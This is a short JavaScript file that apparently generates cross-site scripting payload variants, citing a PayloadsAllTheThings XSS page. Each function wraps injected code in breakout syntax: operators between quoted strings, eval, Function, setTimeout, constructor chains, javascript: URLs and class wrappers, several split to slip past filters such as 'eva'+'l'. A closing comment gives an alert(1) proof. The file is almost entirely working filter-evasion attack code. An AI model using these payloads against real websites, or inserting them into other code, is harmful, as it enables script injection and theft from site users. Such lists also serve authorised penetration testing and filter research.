//https://github.com/swisskyrepo/PayloadsAllTheThings/tree/4b77292aebc54f847747e29c5ea0bf9183b5eeb8/XSS%20Injection

function _statements_2(code){return `'te' * ${code} * 'xt';`}
function _statements_3(code){return `'te' / ${code} / 'xt';`}
function _statements_4(code){return `'te' % ${code} % 'xt';`}
function _statements_5(code){return `'te' - ${code} - 'xt';`}
function _statements_6(code){return `'te' + ${code} + 'xt';`}
function _statements_7(code){return `'te' ^ ${code} ^ 'xt';`}
function _statements_8(code){return `'te' > ${code} > 'xt';`}
function _statements_9(code){return `'te' < ${code} < 'xt';`}
function _statements_10(code){return `'te' == ${code} == 'xt';`}
function _statements_11(code){return `'te' & ${code} & 'xt';`}
function _statements_12(code){return `'te' , ${code} , 'xt';`}
function _statements_13(code){return `'te' | ${code} | 'xt';`}
function _statements_14(code){return `'te' ? ${code} : 'xt';`}
function _statements_15(code){return `'te' in ${code} in 'xt';`}
function _statements_16(code){return `'te' instanceof ${code} instanceof 'xt';`}
function _function_1(code){return `eval(${code});`}
function _function_2(code){return `Function(${code})();`}
function _function_3(code){return `new Function()(${code});`}
function _function_5(code){return `open('javascript:${code}');`}
function _function_6(code){return `setTimeout(${code},0);`}
function _function_7(code){return `constructor.constructor(${code})();`}
function _function_8(code){return `Set.constructor("eval"+"${code}")();`}
function _varset_1(code){return `location='javascript:${code}';`}
function _arrayexec_1(code){return `top["eva"+"l"](${code});`}
function _arrayexec_2(code){return `[].filter.constructor(${code})();`}
function _class_1(code){return `class exec{constructor(){this.code=${code}};exec(){eval(this.code)}};new exec().exec();`}
function _class_2(code){return `class exec{constructor(){this.code=${code}};exec(){Function(this.code)()}};new exec().exec();`}
function _class_3(code){return `class exec{constructor(){this.code=${code}};exec(){new Function()(this.code)}};new exec().exec();`}
function _class_4(code){return `class exec{constructor(){eval(${code})}};new exec();`}
function _class_5(code){return `class exec{constructor(){Function(${code})()}};new exec();`}
function _class_6(code){return `class exec{constructor(){new Function()(${code})}};new exec();`}
//[].map.constructor('alert(1)')()